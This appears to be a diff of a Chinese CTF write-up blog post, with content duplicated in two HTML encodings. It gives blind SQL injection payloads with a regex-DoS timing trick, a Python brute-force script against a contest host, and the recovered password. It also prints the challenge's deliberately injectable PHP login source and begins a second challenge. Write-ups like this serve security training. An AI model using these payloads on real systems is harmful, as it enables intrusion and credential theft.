-<p>之前了解过可以通过不用列名的方式注入，所以这里觉得应该可以直接读<code>password</code>或者什么，管他这个列名叫啥，读就对了。注意这里用<code>offset 1 limit 1</code>读第二个才是真正的密码，这里时间不太够，临时用手验证了前几位。爆了 4 位得到<code>F1AG</code>，以为就是密码了…结果错了&mldr;最后还是手动加脚本跑出来了</p>
-<pre tabindex=0><code>admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),2,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and substr((SELECT database() limit 0,1),3,1) = &#39;f&#39; and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
+</code></pre><p>数据库名字为 ctf</p><p>但是如果要接下去拿表名的话传统方法只能去利用<code>information_schema</code>，但是<code>or</code>又被过滤了，而<code>information_schema</code>中又含有<code>or</code>，所以肯定不能行。</p><p>过滤了<code>information_schema</code>基本上没什么替代方式了。所以我们这里只能另辟蹊径。</p><p>之前了解过可以通过不用列名的方式注入，所以这里觉得应该可以直接读<code>password</code>或者什么，管他这个列名叫啥，读就对了。注意这里用<code>offset 1 limit 1</code>读第二个才是真正的密码，这里时间不太够，临时用手验证了前几位。爆了 4 位得到<code>F1AG</code>，以为就是密码了…结果错了&mldr;最后还是手动加脚本跑出来了</p><pre tabindex=0><code>admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),2,1)) = 49 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),3,1)) = 65 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),3,1)) = 65 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),4,1)) = 71 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),4,1)) = 71 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),5,1)) = 64 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),5,1)) = 64 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),6,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),6,1)) = 49 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
 
-admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#
-</code></pre><p>注意这里最好不要用<code>substr()='x'</code>这样判断，大小写很有问题，而且当时网络环境极其不好…跑了好几遍都有不同的答案…最后在赛后用<code>ascii</code>跑出了密码，附脚本</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># encoding: utf-8</span>
-<span class=kn>import</span> <span class=nn>requests</span>
-<span class=kn>import</span> <span class=nn>re</span>
-
-<span class=n>index_url</span> <span class=o>=</span> <span class=s2>&#34;http://39.97.227.64:52105/&#34;</span>
-
-<span class=n>header</span> <span class=o>=</span> <span class=p>{</span>
-    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;</span><span class=p>,</span>
-<span class=p>}</span>
-
-<span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
-<span class=n>table</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
-<span class=n>column</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
-
-<span class=n>proxies</span><span class=o>=</span><span class=p>{</span>
-    <span class=s1>&#39;http&#39;</span><span class=p>:</span><span class=s1>&#39;http://127.0.0.1:8080/&#39;</span>
-<span class=p>}</span>
-
-<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>32</span><span class=p>):</span>
-    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
-    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>33</span><span class=p>,</span><span class=mi>126</span><span class=p>):</span>
-        <span class=c1># j = ord(j)</span>
-        <span class=c1># payload = &#34;0\&#34;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),&#34;+ str(i) +&#34;,1))=&#34;+ str(j) +&#34;),sleep(5),0);%23&#34;</span>
-        <span class=n>string1</span> <span class=o>=</span> <span class=s2>&#34;admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),&#34;</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;,1)) = &#39;&#34;</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;&#39; and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#&#34;</span>
-        <span class=n>payload</span> <span class=o>=</span><span class=p>{</span>
-            <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>string1</span><span class=p>,</span>
-            <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;11&#39;</span>
-        <span class=p>}</span>
-        
-        <span class=n>url</span> <span class=o>=</span> <span class=n>index_url</span>
-        <span class=k>try</span><span class=p>:</span>
-            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mf>3.5</span><span class=p>,</span><span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span>
-        <span class=k>except</span><span class=p>:</span>
-            <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
-            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
-            <span class=k>break</span>
-</code></pre></div><p>得到密码：</p>
-<pre tabindex=0><code>F1AG@1s-at_/fll1llag_h3r3
-</code></pre><p>进去看到 admin 页面，也很明显，也就是 Rogue mysql 那一套了。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007327.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007327.jpg loading=lazy>
-</a>
-</figure></p>
-<p>DDCTF 2019 /HGAME 2019我都有写相关的 wp ，这里就不再重复了。老一套的操作，不过这里他是不能指定端口，固定访问你的 3306 ，所以你需要把自己的 vps 的 3306 端口开启才行。按照密码提示直接读就是了</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009620.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009620.jpg loading=lazy>
-</a>
-</figure></p>
-<p>顺便拿了一波题目源码</p>
-<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;!doctype html&gt;
-&lt;html lang=&quot;en&quot;&gt;
+admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#
+</code></pre><p>注意这里最好不要用<code>substr()='x'</code>这样判断，大小写很有问题，而且当时网络环境极其不好…跑了好几遍都有不同的答案…最后在赛后用<code>ascii</code>跑出了密码，附脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># encoding: utf-8</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index_url</span> <span class=o>=</span> <span class=s2>&#34;http://39.97.227.64:52105/&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>header</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>table</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>column</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>proxies</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;http&#39;</span><span class=p>:</span><span class=s1>&#39;http://127.0.0.1:8080/&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>33</span><span class=p>,</span><span class=mi>126</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=c1># j = ord(j)</span>
+</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;0\&#34;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),&#34;+ str(i) +&#34;,1))=&#34;+ str(j) +&#34;),sleep(5),0);%23&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>string1</span> <span class=o>=</span> <span class=s2>&#34;admin&#39; and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),&#34;</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;,1)) = &#39;&#34;</span><span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;&#39; and rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);#&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>string1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;11&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>index_url</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mf>3.5</span><span class=p>,</span><span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span></code></pre></div><p>得到密码：</p><pre tabindex=0><code>F1AG@1s-at_/fll1llag_h3r3
+</code></pre><p>进去看到 admin 页面，也很明显，也就是 Rogue mysql 那一套了。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007327.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007327.jpg loading=lazy></a></figure></p><p>DDCTF 2019 /HGAME 2019我都有写相关的 wp ，这里就不再重复了。老一套的操作，不过这里他是不能指定端口，固定访问你的 3306 ，所以你需要把自己的 vps 的 3306 端口开启才行。按照密码提示直接读就是了</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009620.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009620.jpg loading=lazy></a></figure></p><p>顺便拿了一波题目源码</p><pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;!doctype html&gt;
+&lt;html lang=&#34;en&#34;&gt;
 &lt;head&gt;
-    &lt;meta charset=&quot;utf-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
-    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
-    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;
+    &lt;meta charset=&#34;utf-8&#34;&gt;
+    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
+    &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
+    &lt;meta name=&#34;author&#34; content=&#34;&#34;&gt;
 
     &lt;title&gt;全宇宙最简单的SQL&lt;/title&gt;
 
     &lt;!-- Bootstrap core CSS --&gt;
-    &lt;link href=&quot;bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&#34;bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
 
     &lt;!-- Custom styles for this template --&gt;
-    &lt;link href=&quot;grid.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&#34;grid.css&#34; rel=&#34;stylesheet&#34;&gt;
 &lt;/head&gt;
 
-&lt;body style=&quot;background-color: lightgrey&quot;&gt;
-&lt;div class=&quot;container&quot;&gt;
+&lt;body style=&#34;background-color: lightgrey&#34;&gt;
+&lt;div class=&#34;container&#34;&gt;
 
     &lt;h1&gt;全宇宙最简单的SQL&lt;/h1&gt;
-    &lt;p class=&quot;lead&quot;&gt;没有比这题更简单的SQL了，我把秘密藏在数据库里面了！&lt;/p&gt;
+    &lt;p class=&#34;lead&#34;&gt;没有比这题更简单的SQL了，我把秘密藏在数据库里面了！&lt;/p&gt;
 
     &lt;hr&gt;
     &lt;?php
         error_reporting(0);
         session_start();
-        if (!$_SESSION['admin']) {
-            if (!$_SERVER['HTTP_ACCEPT']) {
-                echo &quot;&lt;p style='color: red'&gt;你莫非是机器人？&lt;/p&gt;&quot;;
-            }else if (!empty($_POST['password']) &amp;&amp; !empty($_POST['username'])) {
+        if (!$_SESSION[&#39;admin&#39;]) {
+            if (!$_SERVER[&#39;HTTP_ACCEPT&#39;]) {
+                echo &#34;&lt;p style=&#39;color: red&#39;&gt;你莫非是机器人？&lt;/p&gt;&#34;;
+            }else if (!empty($_POST[&#39;password&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;])) {
                 $conn = new mysqli();
-                $conn -&gt; connect(&quot;localhost&quot;, &quot;ctf123&quot;, &quot;ctf123&quot;, 'ctf', 3306);
+                $conn -&gt; connect(&#34;localhost&#34;, &#34;ctf123&#34;, &#34;ctf123&#34;, &#39;ctf&#39;, 3306);
                 if ($conn -&gt; connect_errno) {
-                    echo &quot;&lt;p style='color: red'&gt;数据库连接失败: &quot; . $conn -&gt; connect_error . &quot;&lt;/p&gt;&quot;;
+                    echo &#34;&lt;p style=&#39;color: red&#39;&gt;数据库连接失败: &#34; . $conn -&gt; connect_error . &#34;&lt;/p&gt;&#34;;
                 } else {
-                    $_POST['username'] = preg_replace(&quot;/join|get_lock|benchmark|sleep|make_set|field|elt|if|case|or|\|/i&quot;, &quot;QwQ&quot;, $_POST['username']);
-                    echo &quot;&lt;p style='color: green'&gt;登录用户名：&quot; . $_POST['username'] . &quot;&lt;/p&gt;&quot;;
-                    $conn -&gt; set_charset(&quot;utf8&quot;);
-                    $sql = &quot;select password from user where username='&quot; . $_POST['username'] . &quot;'&quot;;
+                    $_POST[&#39;username&#39;] = preg_replace(&#34;/join|get_lock|benchmark|sleep|make_set|field|elt|if|case|or|\|/i&#34;, &#34;QwQ&#34;, $_POST[&#39;username&#39;]);
+                    echo &#34;&lt;p style=&#39;color: green&#39;&gt;登录用户名：&#34; . $_POST[&#39;username&#39;] . &#34;&lt;/p&gt;&#34;;
+                    $conn -&gt; set_charset(&#34;utf8&#34;);
+                    $sql = &#34;select password from user where username=&#39;&#34; . $_POST[&#39;username&#39;] . &#34;&#39;&#34;;
                     $result = $conn -&gt; query($sql);
                     if ($conn -&gt; errno) {
-                        echo &quot;&lt;p style='color: red'&gt;数据库操作失败！&lt;/p&gt;&quot;;
+                        echo &#34;&lt;p style=&#39;color: red&#39;&gt;数据库操作失败！&lt;/p&gt;&#34;;
                     }else {
                         if (!$result) {
-                            echo &quot;&lt;p style='color: red'&gt;登陆失败！&lt;/p&gt;&quot;;
+                            echo &#34;&lt;p style=&#39;color: red&#39;&gt;登陆失败！&lt;/p&gt;&#34;;
                         }else {
                             $row = $result -&gt; fetch_assoc();
-                            if ($row['password'] === $_POST['password'] &amp;&amp; $_POST['username'] === 'admin') {
-                                $_SESSION['admin'] = 1;
+                            if ($row[&#39;password&#39;] === $_POST[&#39;password&#39;] &amp;&amp; $_POST[&#39;username&#39;] === &#39;admin&#39;) {
+                                $_SESSION[&#39;admin&#39;] = 1;
                             }else {
-                                echo &quot;&lt;p style='color: red'&gt;登陆失败！&lt;/p&gt;&quot;;
+                                echo &#34;&lt;p style=&#39;color: red&#39;&gt;登陆失败！&lt;/p&gt;&#34;;
                             }
                         }
                     }
                     $conn -&gt; close();
                 }
             }else {
-                echo &quot;&lt;p style='color: red'&gt;你不是管理员！&lt;/p&gt;&quot;;
+                echo &#34;&lt;p style=&#39;color: red&#39;&gt;你不是管理员！&lt;/p&gt;&#34;;
             }
         }
-        if ($_SESSION['admin']) {
-            echo &quot;&lt;p style='color: green'&gt;你好！管理员！&lt;/p&gt;&quot;;
-            if (!empty($_POST['host']) &amp;&amp; !empty($_POST['password']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['sql']) &amp;&amp; !empty($_POST['database'])) {
+        if ($_SESSION[&#39;admin&#39;]) {
+            echo &#34;&lt;p style=&#39;color: green&#39;&gt;你好！管理员！&lt;/p&gt;&#34;;
+            if (!empty($_POST[&#39;host&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;sql&#39;]) &amp;&amp; !empty($_POST[&#39;database&#39;])) {
                 $conn = new mysqli();
-                $conn -&gt; connect($_POST['host'], $_POST['username'], $_POST['password'], $_POST['database'], 3306);
+                $conn -&gt; connect($_POST[&#39;host&#39;], $_POST[&#39;username&#39;], $_POST[&#39;password&#39;], $_POST[&#39;database&#39;], 3306);
                 if ($conn -&gt; connect_errno) {
-                    echo &quot;&lt;p style='color: red'&gt;数据库连接失败: &quot; . $conn -&gt; connect_error . &quot;&lt;/p&gt;&quot;;
+                    echo &#34;&lt;p style=&#39;color: red&#39;&gt;数据库连接失败: &#34; . $conn -&gt; connect_error . &#34;&lt;/p&gt;&#34;;
                 } else {
-                    $conn -&gt; set_charset(&quot;utf8&quot;);
-                    $result = $conn -&gt; query($_POST['sql']);
+                    $conn -&gt; set_charset(&#34;utf8&#34;);
+                    $result = $conn -&gt; query($_POST[&#39;sql&#39;]);
                     if (!$result) {
-                        echo &quot;&lt;p style='color: red'&gt;SQL执行失败！&lt;/p&gt;&quot;;
+                        echo &#34;&lt;p style=&#39;color: red&#39;&gt;SQL执行失败！&lt;/p&gt;&#34;;
                     }else {
-                        echo &quot;&lt;p style='color: green'&gt;SQL执行成功！&lt;/p&gt;&quot;;
+                        echo &#34;&lt;p style=&#39;color: green&#39;&gt;SQL执行成功！&lt;/p&gt;&#34;;
                     }
                     $conn -&gt; close();
                 }
             }else {
-                echo &quot;&lt;p style='color: green'&gt;你可以在这里对远程数据库进行操作！&lt;/p&gt;&quot;;
+                echo &#34;&lt;p style=&#39;color: green&#39;&gt;你可以在这里对远程数据库进行操作！&lt;/p&gt;&#34;;
             }
         }
     ?&gt;
     &lt;hr&gt;
     &lt;p&gt;&lt;/p&gt;
-    &lt;form action=&quot;&quot; method=&quot;post&quot; class=&quot;row&quot;&gt;
+    &lt;form action=&#34;&#34; method=&#34;post&#34; class=&#34;row&#34;&gt;
         &lt;?php
-            if (!$_SESSION['admin']) {
-                echo '&lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;username&quot;&gt;';
-                echo '&lt;input type=&quot;text&quot; name=&quot;password&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;password&quot;&gt;';
+            if (!$_SESSION[&#39;admin&#39;]) {
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;username&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;username&#34;&gt;&#39;;
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;password&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;password&#34;&gt;&#39;;
             }else {
-                echo '&lt;input type=&quot;text&quot; name=&quot;host&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;host&quot;&gt;';
-                echo '&lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;username&quot;&gt;';
-                echo '&lt;input type=&quot;text&quot; name=&quot;password&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;password&quot;&gt;';
-                echo '&lt;input type=&quot;text&quot; name=&quot;database&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;database&quot;&gt;';
-                echo '&lt;input type=&quot;text&quot; name=&quot;sql&quot; class=&quot;col-6 col-lg-4&quot; placeholder=&quot;sql&quot;&gt;';
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;host&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;host&#34;&gt;&#39;;
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;username&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;username&#34;&gt;&#39;;
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;password&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;password&#34;&gt;&#39;;
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;database&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;database&#34;&gt;&#39;;
+                echo &#39;&lt;input type=&#34;text&#34; name=&#34;sql&#34; class=&#34;col-6 col-lg-4&#34; placeholder=&#34;sql&#34;&gt;&#39;;
             }
         ?&gt;
-        &lt;input type=&quot;submit&quot; class=&quot;col-6 col-lg-4&quot; value=&quot;submit&quot;&gt;
+        &lt;input type=&#34;submit&#34; class=&#34;col-6 col-lg-4&#34; value=&#34;submit&#34;&gt;
     &lt;/form&gt;
 
 &lt;/div&gt; &lt;!-- /container --&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>这题比较可惜，时间不太够，比赛结束的40min多就做出来了&mldr;今天太困了，中午睡了好一会，时间足够的话肯定能搞出来的…可惜可惜。</p>
-<p>最近看了还可以有</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>cot</span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>left</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span><span class=s1>&#39;a&#39;</span><span class=p>);</span><span class=o>#</span><span class=w>
-</span></code></pre></div><p>这样的 bool 盲注的形式</p>
-<h1 id=day-2>Day 2</h1>
-<h2 id=web-1>Web</h2>
-<h3 id=love_math>Love_Math</h3>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php> <span class=o>&lt;?</span><span class=nx>php</span>
-<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
-<span class=c1>//听说你很喜欢数学，不知道你是否爱它胜过爱flag
-</span><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span>
-    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-<span class=p>}</span><span class=k>else</span><span class=p>{</span>
-    <span class=c1>//例子 c=20-1
-</span><span class=c1></span>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
-    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>80</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;太长了不会算&#34;</span><span class=p>);</span>
-    <span class=p>}</span>
-    <span class=nv>$blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;\t&#39;</span><span class=p>,</span> <span class=s1>&#39;\r&#39;</span><span class=p>,</span> <span class=s1>&#39;\n&#39;</span><span class=p>,</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;`&#39;</span><span class=p>,</span> <span class=s1>&#39;\[&#39;</span><span class=p>,</span> <span class=s1>&#39;\]&#39;</span><span class=p>];</span>
-    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$blacklist</span> <span class=k>as</span> <span class=nv>$blackitem</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$blackitem</span> <span class=o>.</span> <span class=s1>&#39;/m&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
-            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的字符&#34;</span><span class=p>);</span>
-        <span class=p>}</span>
-    <span class=p>}</span>
-    <span class=c1>//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
